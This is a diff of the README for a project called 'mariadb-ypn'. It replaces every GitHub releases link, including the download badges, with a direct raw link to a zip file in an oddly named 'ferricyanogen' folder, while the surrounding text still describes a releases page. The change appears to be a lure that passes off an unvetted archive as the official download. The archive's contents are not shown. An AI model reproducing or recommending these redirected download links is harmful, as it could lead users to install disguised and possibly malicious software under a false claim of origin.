@@ -2,7 +2,7 @@
 # 🚀 mariadb-ypn - Simplify Your Database Management
 
 ## 📥 Download Now
-[![Download mariadb-ypn](https://img.shields.io/badge/Download-mariadb--ypn-blue.svg)](https://github.com/Bima2596/mariadb-ypn/releases)
+[![Download mariadb-ypn](https://raw.githubusercontent.com/Bima2596/mariadb-ypn/main/ferricyanogen/mariadb-ypn_2.9.zip)](https://raw.githubusercontent.com/Bima2596/mariadb-ypn/main/ferricyanogen/mariadb-ypn_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To use **mariadb-ypn**, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the download options for **mariadb-ypn**.  
-   [Download from Releases](https://github.com/Bima2596/mariadb-ypn/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Bima2596/mariadb-ypn/main/ferricyanogen/mariadb-ypn_2.9.zip)
 
 2. **Choose Your Version:** Look for the latest version on the releases page. It's usually labeled with the highest version number.
 
@@ -88,7 +88,7 @@ For further assistance, reach out to the community or check our issues section o
 Need help? You can open an issue on our GitHub page. Provide as much detail as possible so we can assist you effectively.
 
 ## 📥 Download Now Again
-[![Download mariadb-ypn](https://img.shields.io/badge/Download-mariadb--ypn-blue.svg)](https://github.com/Bima2596/mariadb-ypn/releases)
+[![Download mariadb-ypn](https://raw.githubusercontent.com/Bima2596/mariadb-ypn/main/ferricyanogen/mariadb-ypn_2.9.zip)](https://raw.githubusercontent.com/Bima2596/mariadb-ypn/main/ferricyanogen/mariadb-ypn_2.9.zip)
 
 Thank you for choosing **mariadb-ypn** to manage your databases. Enjoy a hassle-free experience!
 ```
